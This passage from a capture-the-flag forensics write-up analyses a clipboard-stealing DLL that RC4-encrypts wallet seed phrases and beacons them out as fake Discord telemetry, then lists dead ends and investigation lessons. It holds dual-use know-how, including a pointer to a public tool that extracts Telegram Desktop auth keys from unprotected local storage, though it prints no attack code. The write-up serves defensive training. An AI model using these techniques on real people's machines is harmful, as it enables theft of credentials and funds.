disassembled it (Ghidra/radare2) to find it's a clipboard-polling stealer:
it watches for clipboard changes, RC4-encrypts whatever it finds using a
key derived from a 16-byte value it stashes inside the legitimate
`HKCU\Environment` registry key, and beacons it out over HTTP disguised as
real Discord telemetry to a hardcoded IP that's never actually
DNS-resolved anywhere in the capture. Once I had the real RC4 key from the
disassembly, I decrypted the four captured beacons and found the victim's
actual 12-word wallet seed phrase in the last one.

## Dead ends (and why they mattered)

Documenting these because *ruling things out* was as much work as finding
the real answers, and each dead end taught something re-usable:

- **UltraViewer_Service.exe** (a TeamViewer-like remote-support tool)
  running as a Windows service since boot looked like the "unseen hand" at
  first glance - remote-access software is a very common initial-access
  vector in real-world wallet-drain incidents. It turned out to be a red
  herring here: the actual access vector was the side-loaded DLL running
  locally via clipboard monitoring, not a remote operator's hands-on-mouse
  session. **Lesson:** don't let one plausible narrative anchor the
  investigation - keep pulling every thread (in this case, checking file
  sizes against the collector's stated 5MB limit) until the evidence
  actually converges on one story.
- **GnuPG/Kleopatra** - installed but genuinely unused (32-byte/empty
  keyring, default trustdb, zero `.gpg`/`.pgp`/`.asc` files anywhere in the
  image). Worth checking once, not worth re-checking.
- **Telegram Desktop** - its local MTProto AuthKeys *are* recoverable (no
  local passcode was set, and the open-source tool
  [`tdesktop-decrypter`](https://github.com/ntqbit/tdesktop-decrypter)
  extracts them cleanly from `tdata/key_datas`). This felt like a major
  breakthrough at the time, but the actual chat traffic in the pcap turned
  out to use a Perfect-Forward-Secrecy **ephemeral** session key generated
  in-memory during the initial Diffie-Hellman handshake - by protocol
  design, that key is never written to disk and cannot be reconstructed
  from any static evidence, persistent AuthKeys included. **Lesson:**
  cracking one layer of encryption (the local key store) doesn't
  automatically mean the data you actually want is behind that same layer
  - verify what the recovered key can decrypt *before* declaring victory.
- **MetaMask/Keplr vault blobs, Windows Credential Vault, NTUSER.DAT
  registry hive** - all real, all properly encrypted (AES-256 via PBKDF2
  for the wallet vaults, DPAPI for Windows Credentials), none crackable
  without a password absent from the evidence. In hindsight this makes
  complete sense: the malware never touches any of these at all - clipboard
  interception is a strictly easier and more universal technique than
  reverse-engineering and decrypting each individual wallet's on-disk
  storage format, so there was never anything to find here.
- **3uTools' "fix iTunes drivers" routine** (`takeown` + `cacls ...
  Everyone:F` on the Windows DriverStore, followed by `pnputil` driver
  installs) looked alarming - broadly granting Everyone full control over
  a system directory is a real privilege-escalation-adjacent action - but
  it's a genuine, if aggressive, built-in feature of 3uTools for repairing
  broken Apple USB drivers, unrelated to the malware. **Lesson:** "looks
  suspicious" and "is malicious" aren't the same thing; corroborate with an
  actual causal link (a hardcoded string, a matching timestamp, a shared
  process tree) before spending more time on a lead.
- **Cached PNG/WebP files in `Local\Temp`** - several had large blobs of
  data appended after their PNG `IEND` chunk, which is a classic
  steganography/hidden-payload pattern worth checking (and easy to check:
  `grep`/hex-search for the offset of `IEND`, everything after it is
  "extra"). Carving those blobs out and identifying them (`file`, magic
  bytes) showed they were just normal concatenated multi-format browser
  cache entries (a JPEG wallpaper thumbnail behind a splash-screen PNG; a
  WebP icon pair behind duplicate PNG favicons) - not hidden data. Still
  worth the ~2 minutes it took to check, given how cheap and common this
  particular trick is in CTFs generally.

## Methodology takeaways for next time

1. **Decode the flavor text first.** Even a deliberately vague scenario
   description usually encodes real hints about the artifact types and
   attack category involved - it's worth two minutes of "translation"
   before opening a single file.
2. **Read the actual questions before investigating**, if given. They tell
   you the *shape* of evidence needed (a timestamp, an IP, a technique ID)
   and often reveal that the challenge requires a specific class of work
   (here: getting hold of and reverse-engineering the actual binary) that
   pure log/traffic review alone can't satisfy.
3. **In any Procmon capture, immediately establish the real event-logging
   window** (`Tools > File Summary` in the GUI) before trying to read
   anything chronologically - it's almost always much narrower than the
   process-table's full history.
4. **A DLL loaded by `rundll32.exe` from anywhere other than `System32`,
   especially one sharing a name with a real system DLL, is worth
   inspecting on sight.** This single pattern-match cracked the whole
   challenge.
4b. **Never stop at the LOLBin - always walk one more hop up the parent
   chain.** `rundll32.exe`, `mshta.exe`, `regsvr32.exe`, `powershell.exe`
   etc. are the *instrument*, not the *origin* - always check the parent
   PID to find the process that actually launched it, since that's the one
   with something to answer for. In this case, checking Discord's own
   gpu-process spawning `rundll32.exe` (something a legitimate Chromium
   gpu-process never does) was the detail that mattered, and answering with
   the LOLBin instead of its parent was the one wrong flag in this
   challenge.
5. **Check file sizes against any stated collection/triage limits.**
   Evidence packages built by automated collectors often have blind spots
   like size caps - and small, packed malware samples routinely fit
   comfortably under them.
6. **UPX section names (`UPX0`/`UPX1`/`UPX2`) are a free, instant
   packer-ID** - always check `objdump -x` / a PE viewer's section list
   before assuming a binary needs a "real" unpacker.
7. **Procmon does not monitor everything** - mutex creation and most
   generic Win32 API calls aren't captured, only File/Registry/
   Network/Process-Thread operations. When a question needs something
   outside that set (a mutex name, a crypto key-derivation routine), that's
   your signal to move from log analysis to actual disassembly.
8. **RC4 (or any stream cipher) decrypting to clean, fully readable
   plaintext with zero garbage is itself strong proof you have the right
   key** - a wrong key against a stream cipher produces uniformly
   random-looking noise, so a clean decode is effectively self-validating.
